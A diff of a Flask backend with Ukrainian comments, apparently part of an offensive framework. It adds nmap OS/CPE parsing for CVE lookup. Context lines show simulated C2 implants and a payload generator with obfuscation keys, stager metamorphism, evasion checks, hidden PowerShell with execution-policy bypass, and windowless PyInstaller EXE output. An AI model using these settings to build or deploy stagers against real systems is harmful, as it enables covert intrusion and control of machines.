@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.1
-# Призначення: Backend на Flask з реальною (за наявності PyInstaller) генерацією .EXE.
-# Оновлення v1.8.1:
-#   - Реалізовано фактичний виклик PyInstaller для формату 'pyinstaller_exe_windows'.
-#   - Додано перевірку наявності PyInstaller в системі.
-#   - Обробка тимчасових файлів та результатів компіляції.
-#   - Покращено логування для процесу компіляції.
+# Syntax Flask Backend - Segment SFB-CORE-1.8.2
+# Призначення: Backend на Flask з розширеним парсингом XML-виводу nmap (OS, CPE).
+# Оновлення v1.8.2:
+#   - Розширено parse_nmap_xml_output_for_services для вилучення OS (osmatch) та CPE сервісів.
+#   - perform_nmap_scan_be тепер гарантує використання -sV та -O з -oX для CVE-пошуку.
+#   - Оновлено /api/run_recon для повернення розширеної інформації (OS, CPE).
+#   - Оновлено логування.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -25,7 +25,7 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.1" # Оновлено версію
+VERSION_BACKEND = "1.8.2" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
@@ -39,7 +39,7 @@ CONCEPTUAL_CVE_DATABASE_BE = {
     "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
 }
 
-def initialize_simulated_implants_be():
+def initialize_simulated_implants_be(): # Логіка (без змін)
     global simulated_implants_be, pending_tasks_for_implants
     simulated_implants_be = []
     pending_tasks_for_implants = {} 
@@ -63,7 +63,7 @@ def initialize_simulated_implants_be():
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = {
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.1)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -118,15 +118,15 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass" 
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
-    "output_format": { 
+    "output_format": {
         "type": str, "required": False,
         "allowed_values": ["raw_python_stager", "base64_encoded_stager", "pyinstaller_exe_windows"],
         "default": "raw_python_stager"
     },
-    "pyinstaller_options": { 
+    "pyinstaller_options": {
         "type": str,
         "required": False,
-        "default": "--onefile --noconsole" 
+        "default": "--onefile --noconsole"
     },
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
@@ -382,7 +382,7 @@ def simulate_port_scan_be(target: str) -> tuple[list[str], str]: # Логіка 
     log.append("[RECON_BE_SUCCESS] Імітацію сканування портів завершено.")
     return log, "\n".join(results_text_lines)
 
-def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]: # Логіка (без змін)
+def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]: # Логіка (без змін від v1.7.9)
     parsed_services = []
     parsed_os_info = []
     try:
@@ -1021,10 +1021,7 @@ def handle_generate_payload():
                         f.write(stager_code_raw)
                     log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Python-стейджер збережено у: {temp_py_filename}")
 
-                    # Визначаємо ім'я вихідного файлу на основі імені вхідного файлу
                     base_script_name = os.path.splitext(os.path.basename(temp_py_filename))[0]
-
-                    # Шляхи для PyInstaller всередині тимчасової директорії
                     dist_path = os.path.join(tmpdir, "dist")
                     work_path = os.path.join(tmpdir, "build")
                     
@@ -1033,13 +1030,13 @@ def handle_generate_payload():
                         *pyinstaller_options,
                         "--distpath", dist_path,
                         "--workpath", work_path,
-                        "--specpath", tmpdir, # Зберігаємо .spec файл також у тимчасовій директорії
+                        "--specpath", tmpdir, 
                         temp_py_filename
                     ]
                     log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
                     
                     try:
-                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300) # 5 хвилин на компіляцію
+                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300) 
                         log_messages.append(f"[BACKEND_PYINSTALLER_STDOUT] {compile_process.stdout}")
                         if compile_process.returncode != 0:
                             log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
